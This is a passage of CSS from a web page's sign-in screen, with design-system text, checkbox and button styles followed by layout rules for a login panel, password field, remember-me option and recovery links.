            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        .ux-text {
            --uxText--fontSize0: var(--ux-1a61xr7, var(--ux-vvspv2, 1rem));
            --uxText--fontSize-1: calc(var(--uxText--fontSize0) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize-2: calc(var(--uxText--fontSize-1) var(--ux-ol0703, /) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize1: calc(var(--uxText--fontSize0) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize2: calc(var(--uxText--fontSize1) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize3: calc(var(--uxText--fontSize2) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize4: calc(var(--uxText--fontSize3) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--fontSize5: calc(var(--uxText--fontSize4) var(--ux-y4pg8z, *) var(--ux-7s4p3v, 1.125));
            --uxText--lineHeight: calc(var(--ux-14t1fes, var(--ux-1w31hux, 1.5)) var(--ux-1u3f284, *) var(--ux-51yj5o, 1));
            font-size: var(--uxText--fontSize0);
            line-height: var(--uxText--lineHeight);
            font-family: var(--ux-9pe28g, var(--ux-1067ph9, sans-serif));
            font-weight: var(--ux-v02jxi, var(--ux-sm2he3, 400));
            font-variation-settings: var(--ux-1dpg6l3, var(--ux-6mut96, inherit));
        }

        .ux-text.ux-text-title {
            --uxText--fontSize0: var(--ux-jg1026, var(--ux-18ime9a, 1.5rem));
            --uxText--lineHeight: var(--ux-10e88h5, var(--ux-1pw8hzd, 1.25));
            font-family: var(--ux-1q87e65, var(--ux-p4wcd9, sans-serif));
            font-weight: var(--ux-1b8kf4b, var(--ux-1a9e4a3, 700));
            font-variation-settings: var(--ux-192otyy, var(--ux-3x9eca, inherit));
        }

        .ux-text.ux-text-heading {
            --uxText--fontSize0: var(--ux-jm4jeu, var(--ux-9ic57q, 2rem));
            --uxText--lineHeight: var(--ux-1rdqzoh, var(--ux-p25s1t, 1.25));
            font-family: var(--ux-1md8q7p, var(--ux-shg991, serif));
            font-weight: var(--ux-tjjc5f, var(--ux-c539b7, 700));
            font-variation-settings: var(--ux-1yo4eb6, var(--ux-1458mfm, inherit));
        }

        .ux-text.ux-text-paragraph {
            --uxText--fontSize0: var(--ux-1i8fva8, var(--ux-1klxlj4, 1rem));
            --uxText--lineHeight: var(--ux-yu0s3r, var(--ux-mgbt9j, 1.5));
            font-family: var(--ux-1f6raab, var(--ux-117cu43, sans-serif));
            font-weight: var(--ux-27ku79, var(--ux-8n6y9x, 400));
            font-variation-settings: var(--ux-deyw5w, var(--ux-1i4pt2s, inherit));
        }

        .ux-text.ux-text-action {
            --uxText--fontSize0: var(--ux-74s1bk, var(--ux-cxbe8g, 1rem));
            --uxText--lineHeight: var(--ux-1dry2pj, var(--ux-jw5s9j, 1.5));
            font-family: var(--ux-1ir8vtv, var(--ux-gfnupv, sans-serif));
            font-weight: var(--ux-4g1r2t, var(--ux-j40yyd, 400));
            font-variation-settings: var(--ux-1xspc04, var(--ux-ndnsbo, inherit));
        }

        .ux-text.ux-text-input {
            --uxText--fontSize0: var(--ux-zkzmxk, var(--ux-oc0naw, 1rem));
            --uxText--lineHeight: var(--ux-neouyn, var(--ux-hm1ty7, 1.5));
            font-family: var(--ux-o591yj, var(--ux-9wtaa3, sans-serif));
            font-weight: var(--ux-1095x0d, var(--ux-3z6ccd, 400));
            font-variation-settings: var(--ux-j138x8, var(--ux-e727t8, inherit));
        }

        .ux-text.ux-text-label {
            --uxText--fontSize: var(--ux-1g5b33c, var(--ux-16aixzc, 1rem));
            --uxText--lineHeight: var(--ux-d7itcf, var(--ux-h93mi7, 1.5));
            font-family: var(--ux-134wucb, var(--ux-15ks663, sans-serif));
            font-weight: var(--ux-jigg19, var(--ux-aarlu5, 400));
            font-variation-settings: var(--ux-abra1o, var(--ux-1qg0ofw, inherit));
        }

        .ux-text.ux-text-caption {
            --uxText--fontSize0: var(--ux-1n2ego0, var(--ux-p4h24g, .875rem));
            --uxText--lineHeight: var(--ux-1xkykcn, var(--ux-1dje42v, 1.5));
            font-family: var(--ux-3gzsib, var(--ux-1gutwvn, sans-serif));
            font-weight: var(--ux-1dkcied, var(--ux-g9ierp, 400));
            font-variation-settings: var(--ux-1iow7o, var(--ux-tjt16c, inherit));
        }

        .ux-text.ux-text-size0 {
            font-size: var(--uxText--fontSize0);
        }

        .ux-text.ux-text-size1 {
            font-size: var(--uxText--fontSize1);
        }

        .ux-text.ux-text-size2 {
            font-size: var(--uxText--fontSize2);
        }

        .ux-text.ux-text-size3 {
            font-size: var(--uxText--fontSize3);
        }

        .ux-text.ux-text-size4 {
            font-size: var(--uxText--fontSize4);
        }

        .ux-text.ux-text-size5 {
            font-size: var(--uxText--fontSize5);
        }

        .ux-text.ux-text-size-1 {
            font-size: var(--uxText--fontSize-1);
        }

        .ux-text.ux-text-size-2 {
            font-size: var(--uxText--fontSize-2);
        }

        .ux-text.ux-text-feedback-critical {
            color: var(--ux-1k8kcmw, var(--ux-1fhc073, red));
        }

        .ux-text.ux-text-feedback-success {
            color: var(--ux-1cdj78w, var(--ux-1ep3kxj, green));
        }

        .ux-text.ux-text-feedback-warning {
            color: var(--ux-1atr6wp, var(--ux-lv1r6m, darkorange));
        }

        .ux-text.ux-text-feedback-info {
            color: var(--ux-1orzojh, var(--ux-1lpd00q, blue));
        }

        .ux-text.ux-text-feedback-highlight {
            color: var(--ux-1dmc3b7, var(--ux-cuskv8, blue));
        }

        .ux-text.ux-text-feedback-neutral {
            color: var(--ux-2xcava, var(--ux-e1mf41, blue));
        }

        .ux-text.ux-text-feedback-internal {
            color: var(--ux-114ywl0, var(--ux-1iwdp0z, blue));
        }

        .ux-text.ux-text-feedback-passive {
            color: var(--ux-t9hajc, var(--ux-1m9ys0v, gray));
        }

        .ux-text.ux-text-feedback-premium {
            color: var(--ux-1u7nbuw, var(--ux-143smq7, purple));
        }
    </style>
    <style>
        .ux-checkbox-shell {
            display: inline-grid;
            grid-template-columns: auto 1fr;
            gap: var(--ux-1sbfig8, 0.25rem) calc(var(--ux-1sbfig8, 0.25rem)*2);
            grid-template-areas: "checkbox label" ".        info";
            --uxCheckbox-dimension: 1.25em
        }

        .ux-checkbox-shell[aria-disabled=true] {
            opacity: .4
        }

        .ux-checkbox-shell>* {
            cursor: pointer
        }

        .ux-checkbox-shell[aria-readonly=true]>*,
        .ux-checkbox-shell[aria-disabled=true]>* {
            cursor: not-allowed
        }

        .ux-checkbox-shell .ux-checkbox-lineheightbox {
            position: relative;
            -webkit-align-self: baseline;
            -ms-flex-item-align: baseline;
            align-self: baseline;
            display: inline-block;
            width: var(--uxCheckbox-dimension);
            min-height: var(--uxCheckbox-dimension);
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0
        }

        .ux-checkbox-shell .ux-checkbox-lineheightbox[data-lineheight]:after {
            content: attr(data-lineheight);
            color: transparent
        }

        .ux-checkbox-shell .ux-checkbox-lineheightbox>* {
            box-sizing: border-box;
            cursor: inherit;
            font: inherit;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            margin: 0;
            padding: 0;
            border: 0;
            position: absolute;
            width: 100%;
            height: var(--uxCheckbox-dimension);
            top: 50%;
            -webkit-transform: translateY(-50%);
            -ms-transform: translateY(-50%);
            transform: translateY(-50%)
        }

        .ux-checkbox-shell .ux-checkbox-indicator {
            grid-area: checkbox;
            border: var(--ux-1u5kw9d, var(--ux-3lhizs, 1px)) solid var(--ux-xf650q, var(--ux-by6mab, lightgray));
            background: var(--ux-z9fmw, var(--ux-1nu8itt, white));
            border-radius: var(--ux-udjiof, var(--ux-1oqjeuu, 2px));
            color: transparent;
            pointer-events: none
        }

        .ux-checkbox-shell .ux-checkbox-indicator>* {
            display: none
        }

        .ux-checkbox-shell .ux-checkbox-input {
            opacity: 0
        }

        .ux-checkbox-shell .ux-checkbox-input:checked~.ux-checkbox-indicator,
        .ux-checkbox-shell .ux-checkbox-input:indeterminate~.ux-checkbox-indicator {
            border-color: var(--ux-aetepi, var(--ux-77zzwv, lightgray));
            background: var(--ux-muv1v8, var(--ux-sywk25, white));
            color: var(--ux-24f8yp, var(--ux-1lw8azc, black))
        }

        .ux-checkbox-shell .ux-checkbox-input:checked:not(:indeterminate)~.ux-checkbox-indicator .ux-checkbox-checkmark,
        .ux-checkbox-shell .ux-checkbox-input:indeterminate~.ux-checkbox-indicator .ux-checkbox-indeterminate {
            display: block
        }

        .ux-checkbox-shell .ux-checkbox-label,
        .ux-checkbox-shell .ux-text-caption {
            margin-inline-start: calc(var(--ux-1sbfig8, 0.25rem)*2);
            margin: 0
        }

        .ux-checkbox-shell .ux-text-caption {
            grid-area: info
        }

        .ux-button {
            --ux-button-icon-margin: calc((var(--ux-t379ov, var(--ux-jw5s9j, 1.5)) * 1em - 1.5em) / 2);
            font-weight: inherit;
            background: transparent;
            color: var(--ux-1jw0794, var(--ux-ut3xrx, black));
            margin: 0;
            gap: .5em;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            border: 0;
            padding: 0;
            -webkit-text-decoration: var(--ux-1f7if5p, underline);
            text-decoration: var(--ux-1f7if5p, underline);
            cursor: pointer
        }

        .ux-button--stretch {
            width: 100%
        }

        .ux-button:not([href])>* {
            pointer-events: none
        }

        .ux-button:focus,
        .ux-button.focus {
            outline: var(--uxp-focus-visible-outline, none)
        }

        .ux-button:not([disabled]):hover,
        .ux-button:not([disabled]):active {
            color: var(--ux-1kyybpb, var(--ux-unx9i2, white));
            background-color: transparent
        }

        .ux-button[href] {
            color: var(--ux-iysvx4, var(--ux-2rqapw, black))
        }

        .ux-button[href]:not([disabled]):hover,
        .ux-button[href]:not([disabled]):active {
            color: var(--ux-13nnjtr, var(--ux-1j87vvn, white))
        }

        .ux-button[disabled],
        .ux-button[disabled]:hover {
            opacity: var(--uxButtonDisabled--opacity, 0.4);
            cursor: not-allowed
        }

        .ux-button[aria-hidden=true] {
            visibility: hidden
        }

        .ux-button .ux-button-icon,
        .ux-button .ux-button-accessory {
            vertical-align: middle;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            overflow: visible;
            font-size: 1em;
            margin-block: var(--ux-button-icon-margin)
        }

        .ux-button:not(.ux-button-inline) {
            border: var(--ux-1h06tzo, var(--ux-1q7rsup, 2px)) solid var(--ux-1847qpb, var(--ux-1np4r62, transparent));
            background-color: var(--ux-1ab3cod, var(--ux-1owc8nc, transparent));
            border-radius: var(--ux-f6o8ui, var(--ux-1s5tndb, 2px));
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            min-width: -webkit-min-content;
            min-width: -moz-min-content;
            min-width: min-content;
            white-space: nowrap;
            padding: calc(var(--ux-1sbfig8, 0.25rem)*2) calc(var(--ux-1sbfig8, 0.25rem)*4);
            -webkit-text-decoration: none;
            text-decoration: none;
            -webkit-transition: .15s ease-in-out;
            transition: .15s ease-in-out;
            vertical-align: middle
        }

        .ux-button:not(.ux-button-inline).ux-button-square {
            padding: calc(var(--ux-1sbfig8, 0.25rem)*2)
        }

        .ux-button:not(.ux-button-inline).ux-text-size-1 {
            padding: calc(var(--ux-1sbfig8, 0.25rem)*1) calc(var(--ux-1sbfig8, 0.25rem)*3)
        }

        .ux-button:not(.ux-button-inline).ux-text-size-1.ux-button-square {
            padding: calc(var(--ux-1sbfig8, 0.25rem)*1)
        }

        .ux-button:not(.ux-button-inline):not([disabled]):hover {
            background-color: var(--ux-cup4ju, var(--ux-1m7qrkf, blue));
            color: var(--ux-1kyybpb, var(--ux-unx9i2, white));
            border-color: var(--ux-8xrj7s, var(--ux-1bdtclp, transparent))
        }

        .ux-button:not(.ux-button-inline):not([disabled]):active,
        .ux-button:not(.ux-button-inline):not([disabled])[aria-checked=true],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-expanded=true],
        .ux-button:not(.ux-button-inline):not([disabled])[aria-selected=true] {
            background-color: var(--ux-o7ju0h, var(--ux-9qpf6c, blue));
            color: var(--ux-uq49pg, var(--ux-h6e7c1, white));
            border-color: var(--ux-4hvovn, var(--ux-1xliuhi, transparent))
        }

        .ux-button.ux-button-stateless {
            background-color: transparent;
            color: inherit;
            border-color: transparent
        }

        .ux-button.ux-button-stateless:not([disabled]):hover {
            background-color: transparent;
            color: inherit;
            border-color: transparent
        }

        .ux-button.ux-button-stateless:not([disabled]):active,
        .ux-button.ux-button-stateless:not([disabled])[aria-checked=true],
        .ux-button.ux-button-stateless:not([disabled])[aria-expanded=true],
        .ux-button.ux-button-stateless:not([disabled])[aria-selected=true] {
            background-color: transparent;
            color: inherit;
            border-color: transparent
        }

        @supports(-webkit-backdrop-filter: contrast(0.8)) or (backdrop-filter: contrast(0.8)) {
            .ux-button.ux-button-stateless:not([disabled]):hover {
                -webkit-backdrop-filter: contrast(0.8);
                backdrop-filter: contrast(0.8)
            }
        }

        .ux-button.ux-button-primary {
            background-color: var(--ux-pmb6pt, var(--ux-c5mlr8, green));
            color: var(--ux-1tmjflg, var(--ux-t04p4h, white));
            border-color: var(--ux-pv1fr7, var(--ux-kdwujq, transparent))
        }

        .ux-button.ux-button-primary:not([disabled]):hover {
            background-color: var(--ux-57c70m, var(--ux-ran6wz, green));
            color: var(--ux-ztff7, var(--ux-1ckzto6, white));
            border-color: var(--ux-yuzgck, var(--ux-bgke81, transparent))
        }

        .ux-button.ux-button-primary:not([disabled]):active,
        .ux-button.ux-button-primary:not([disabled])[aria-checked=true],
        .ux-button.ux-button-primary:not([disabled])[aria-expanded=true],
        .ux-button.ux-button-primary:not([disabled])[aria-selected=true] {
            background-color: var(--ux-1rbbkil, var(--ux-1ehwjjs, green));
            color: var(--ux-fzgwq0, var(--ux-1uyxcq5, white));
            border-color: var(--ux-1isvz6n, var(--ux-1hnbfne, transparent))
        }

        .ux-button.ux-button-secondary {
            background-color: var(--ux-1cxvv3r, var(--ux-1r87102, transparent));
            color: var(--ux-9i6wci, var(--ux-w7826f, black));
            border-color: var(--ux-13jzer9, var(--ux-1p5s1n4, transparent))
        }

        .ux-button.ux-button-secondary:not([disabled]):hover {
            background-color: var(--ux-1vtym9c, var(--ux-c624hh, blue));
            color: var(--ux-5ealk5, var(--ux-1e7hthc, white));
            border-color: var(--ux-r6rk8i, var(--ux-kkdx4n, transparent))
        }

        .ux-button.ux-button-secondary:not([disabled]):active,
        .ux-button.ux-button-secondary:not([disabled])[aria-checked=true],
        .ux-button.ux-button-secondary:not([disabled])[aria-expanded=true],
        .ux-button.ux-button-secondary:not([disabled])[aria-selected=true] {
            background-color: var(--ux-1g1zbaj, var(--ux-ix2s5q, blue));
            color: var(--ux-5k9tge, var(--ux-19ykcyj, white));
            border-color: var(--ux-1beoca1, var(--ux-1ixzvrg, transparent))
        }

        .ux-button.ux-button-critical {
            background-color: var(--ux-16qi3qe, var(--ux-1marogz, red));
            color: var(--ux-k7jbzn, var(--ux-17htz86, white));
            border-color: var(--ux-1opx3z8, var(--ux-ceou01, transparent))
        }

        .ux-button.ux-button-critical:not([disabled]):hover {
            background-color: var(--ux-1cnpm0x, var(--ux-1q4q36s, red));
            color: var(--ux-1bt73n8, var(--ux-9cq6k1, white));
            border-color: var(--ux-1uu6y6b, var(--ux-n0tova, transparent))
        }

        .ux-button.ux-button-critical:not([disabled]):active,
        .ux-button.ux-button-critical:not([disabled])[aria-checked=true],
        .ux-button.ux-button-critical:not([disabled])[aria-expanded=true],
        .ux-button.ux-button-critical:not([disabled])[aria-selected=true] {
            background-color: var(--ux-1h2pmii, var(--ux-926l8f, red));
            color: var(--ux-71s1kf, var(--ux-17znn9m, white));
            border-color: var(--ux-1o8e2ig, var(--ux-w3lhdp, transparent))
        }

        .ux-button.ux-button-control {
            border-radius: 0;
            background-color: var(--ux-4yoeju, var(--ux-1mh0ktr, lightgray));
            color: var(--ux-a00lb3, var(--ux-1utwv7e, black));
            border-color: var(--ux-1viaciw, var(--ux-1qbn65p, transparent))
        }

        .ux-button.ux-button-control:not([disabled]):hover {
            background-color: var(--ux-g6t48d, var(--ux-11rtwg8, lightgray));
            color: var(--ux-1t310s8, var(--ux-1e4ese5, white));
            border-color: var(--ux-8xjjjj, var(--ux-bg7olm, transparent))
        }

        .ux-button.ux-button-control:not([disabled]):active,
        .ux-button.ux-button-control:not([disabled])[aria-checked=true],
        .ux-button.ux-button-control:not([disabled])[aria-expanded=true],
        .ux-button.ux-button-control:not([disabled])[aria-selected=true] {
            background-color: var(--ux-z40vau, var(--ux-gdy377, lightgray));
            color: var(--ux-pux60z, var(--ux-k4fkva, white));
            border-color: var(--ux-1ps5g38, var(--ux-187j9dd, transparent))
        }

        #login-panel #verify-code-form .form-group {
            margin-bottom: 0
        }

        #login-panel .form-text {
            margin-bottom: 10px
        }

        #login-panel .modal-footer {
            justify-content: flex-start
        }

        #login-panel .card,
        #login-panel .ux-card {
            margin-bottom: 0
        }

        @media screen and (max-width: 767px) {

            #login-panel #new-ux.card.ux-card.idp .card-block.idp,
            #login-panel #new-ux.card.ux-card.reseller .card-block.reseller {
                padding-top: 8px !important
            }
        }

        @media(max-device-width: 767px) {
            .form-container {
                border: 0;
                border-radius: 0
            }
        }

        @media(max-width: 767px) {
            .form-container {
                border: 0;
                border-radius: 0
            }
        }

        #login-panel .card-block.pass,
        #login-panel .card-block.pass.reseller {
            padding: 0
        }

        #login-panel #provisioning-template {
            padding-top: 10px;
            padding-bottom: 40px
        }

        #login-panel #provisioning-template .page-title {
            margin-bottom: 16px
        }

        #login-panel #provisioning-template .page-subtitle {
            margin-bottom: 8px
        }

        #login-panel #provisioning-template #submit-button {
            display: grid
        }

        #login-panel #provisioning-template .password-confirm-pwd .form-group {
            margin-bottom: 24px !important
        }

        #login-panel #provisioning-template .password-confirm-pwd {
            padding-top: 8px
        }

        #login-panel .pass #form-container {
            padding: 10px 20px 30px 20px
        }

        #login-panel #form-header #pass-template .logo-container-pass-o365 {
            padding-top: 0px;
            margin-bottom: 15px
        }

        #login-panel #password-container,
        #login-panel #email-container,
        #login-panel #username-container {
            margin-bottom: 1.5rem
        }

        #login-panel #password-container {
            position: relative
        }

        [dir=ltr] #login-panel .show-hide {
            right: 0px
        }

        [dir=rtl] #login-panel .show-hide {
            left: 0px
        }

        #login-panel .show-hide {
            position: absolute;
            top: 0px
        }

        #login-panel .tos-text {
            color: #999;
            display: inline;
            font-size: 13px
        }

        #login-panel #success-screen #form-header {
            margin-bottom: 16px;
            margin-top: 40px
        }

        #login-panel #success-screen h4 {
            margin-bottom: 0
        }

        #login-panel #success-screen #finish-string-container {
            padding-top: 0
        }

        #login-panel #provisioning-template {
            padding-left: 20px;
            padding-right: 20px
        }

        @media(min-width: 768px) {

            #login-panel #new-ux.card.ux-card .card-block.idp,
            #login-panel #new-ux.card.ux-card .card-block.idp.reseller {
                padding: 40px 48px
            }

            #login-panel #provisioning-template {
                padding-left: 90px;
                padding-right: 90px
            }

            #new-ux.migration-brand,
            .poynt {
                width: fit-content;
                width: -moz-fit-content
            }
        }

        @media(min-width: 1200px) {
            #login-panel .pass #form-container {
                padding: 25px 100px 35px 100px
            }
        }

        #login-panel a {
            cursor: pointer
        }

        #login-panel #custom-subtitle {
            display: flex;
            flex-wrap: wrap;
            padding-bottom: 15px;
            justify-content: center
        }

        #login-panel .migration #custom-subtitle {
            padding-bottom: 0
        }

        #create-account-link {
            margin: 15px 0 16px 0
        }

        #login-panel #new-ux #create-account-link {
            display: flex;
            flex-wrap: wrap;
            justify-content: center
        }

        [dir=ltr] #login-panel #new-ux #create-account-link.remove-login-header {
            justify-content: left
        }

        [dir=rtl] #login-panel #new-ux #create-account-link.remove-login-header {
            justify-content: right
        }

        [dir=ltr] #login-panel #new-ux #create-account-link p {
            margin-bottom: 0px;
            margin-right: 5px
        }

        [dir=rtl] #login-panel #new-ux #create-account-link p {
            margin-bottom: 0px;
            margin-left: 5px
        }

        [dir=ltr] #login-panel #new-ux.reseller #create-account-link {
            justify-content: left
        }

        [dir=rtl] #login-panel #new-ux.reseller #create-account-link {
            justify-content: right
        }

        #login-panel .sso-field-danger {
            border-color: #db1802 !important;
            background-color: #fadcd9 !important;
            box-shadow: none !important
        }

        #login-panel .username-input {
            text-align: left
        }

        #login-panel #remember-me-container {
            margin-bottom: .75rem
        }

        [dir=rtl] #login-panel #remember-me-container {
            text-align: right
        }

        #login-panel #remember-me-container>.form-group {
            display: inline;
            margin: 0
        }

        #login-panel #remember-me-container #label-remember-me {
            margin-right: auto !important
        }

        #login-panel .card-block #submitBtn,
        #login-panel #loginGDBtn,
        #login-panel #non-progessive-sign-in {
            min-width: 100%
        }

        #login-panel .card-block .modal-footer #sign-in-btn {
            margin-bottom: 0px
        }

        #login-panel .card-block .modal-footer #create-with-fb-btn {
            white-space: nowrap
        }

        #login-panel .modal .ux-button-set {
            margin-bottom: 0px;
            width: 100%
        }

        #login-panel #text-social-button-divider {
            margin-top: 7px;
            margin-bottom: 11px;
            text-align: center
        }

        #login-panel #emailPromoButton {
            min-width: 100%;
            max-height: 40px
        }

        #login-panel #federation-login-divider {
            margin-top: 20px;
            margin-bottom: 7px;
            text-align: center;
            font-weight: bold
        }

        #login-panel #recovery-links {
            margin: 15px 0 0 0;
            text-align: center
        }

        #login-panel .reseller-help-info {
            text-align: center;
            margin-top: 15px
        }

        #login-panel .btn-link {
            cursor: pointer;
            text-decoration: underline
        }

        #login-panel #email-promo-footer {
            text-align: center;
            position: relative;
            display: flex;
            flex-direction: column;
            word-wrap: break-word;
            background-clip: border-box;
            margin-top: 20px;
            padding: 0px 20px 0px 20px;
            margin-bottom: 30px
        }

        @media(min-width: 1200px) {
            #login-panel #email-promo-footer {
                padding: 0px 100px 0px 100px
            }
        }

        #login-panel #email-promo-footer #email-message {
            color: #444;
            font-size: 16px;
            text-align: center;
            margin-bottom: 15px
        }

        #login-panel .tac-collection p {
            margin-bottom: 15px
        }

        #login-panel .tac-collection .info-group {
            margin-bottom: 20px
        }

        #login-panel .tac-collection .form-group .uxicon,
        #login-panel .tac-collection .form-group .ux-spinner {
            margin-left: 3px;
            margin-right: 0
        }

        #login-panel .tac-selection #next-button {
            width: 100%;
            max-width: none
        }

        #login-panel .tac-selection .back-button,
        #login-panel .tac-selection p {
            margin-bottom: 18px
        }

        #login-panel .tac-selection .sibling-set-margin {
            margin-bottom: 32px
        }

        #login-panel #login-status-message {
            margin-bottom: 24px
        }

        #login-panel #form-header #migration-header-template .logo-container {
            margin-bottom: 15px
        }

        #login-panel #spinner-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 0
        }

        #login-panel .sign-in-without-password {
            margin-top: 24px
        }

        #login-panel .sign-in-different-way-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 24px
        }

        #login-panel #back-button>button {
            text-decoration: underline
        }

        #login-panel #too-many-shoppers-alert {
            margin-top: 18px
        }

        #login-panel #too-many-shoppers-alert p {
            margin: 0
        }

        .ux-app .ux-disrupt-backdrop {
            z-index: 1
        }

        #login-panel .access-error-template {
            display: flex;
            flex-direction: column;
            gap: .75rem
        }

        #login-panel .access-error-template-header {
            display: flex;
            flex-direction: column;
            gap: 1.5rem
        }

        #login-panel .access-error-template-header>h1 {
            margin: 0
        }
    </style>
    <style>
        * {
